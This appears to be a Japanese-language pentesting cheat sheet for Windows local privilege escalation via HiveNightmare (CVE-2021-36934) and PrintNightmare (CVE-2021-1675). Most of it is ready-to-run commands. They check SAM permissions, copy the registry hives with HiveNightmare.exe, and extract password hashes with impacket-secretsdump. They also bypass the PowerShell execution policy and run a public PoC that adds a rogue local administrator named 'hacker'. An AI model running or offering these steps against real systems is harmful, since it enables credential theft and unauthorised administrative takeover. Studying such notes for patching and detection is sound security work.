# Kernel Exploit

# CVE-2021–36934

CVE-2021-36934 HiveNightmare (別名 SeriousSam) は Windows 10 の欠陥であり、特権レベルに関係なく、あらゆるユーザーが Windows レジストリを読み取り、機密情報にアクセスする権限を持つ。研究者たちにより、SAM、SYSTEM、および SECURITY レジストリ ハイブの読み取りを許可し、後でオフラインで処理するためのコピーを作成し、SecretsDump.py などのツールを使用してパスワード ハッシュ (ローカル管理者を含む) を抽出できるようにする PoC エクスプロイトが開発された。

## SAM ファイルの権限を確認する

icacls を使用して SAM ファイルのアクセス許可を確認し、この脆弱性を確認できる。この例では、ファイルは BUILTIN\Users グループによって読み取り可能であるため、脆弱なバージョンが存在する

```
C:\hatto> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## 攻撃の実行とパスワード ハッシュの解析

[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare) を使用して攻撃を実行し、前述のレジストリ ハイブのコピーを作成する

```
.\HiveNightmare.exe
```

以下のファイルが作成される

```
SAM-2021-08-07
SYSTEM-2021-08-07
SECURITY-2021-08-07
```

攻撃マシンで `impacket-secretsdump` を使用して解析する

```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```



# CVE-2021-1675

CVE-2021-1675は、Windows Print Spoolerサービスに関連する脆弱性で、「PrintNightmare」としても知られている。この脆弱性は、リモートコード実行 (RCE) を引き起こす可能性があり、攻撃者がリモートからシステムを制御できるようになる具体的には、Windows Print Spoolerサービスが印刷ジョブを処理する際のアクセス制御リスト (ACL) の不備を悪用することで、攻撃者は特権を持たないユーザーアカウントからでも任意のコードを実行できる可能性がある

## スプーラー サービスの確認

Spooler サービスが実行されているかどうかをすぐに確認できます。実行されていない場合は、 `path does not exist` というエラーが表示される

```
ls \\localhost\pipe\spoolss
```

## PrintNightmare PowerShell PoC を使用してローカル管理者を追加する

ターゲット ホストで実行ポリシーをバイパスする

```powershell-session
PS C:\hatto> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

実行に成功すると[Powershell script](https://github.com/calebstewart/CVE-2021-1675/tree/main)で新しいユーザーをローカル管理者グループに追加できる

```
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

追加されたかの確認

```
net user hacker
```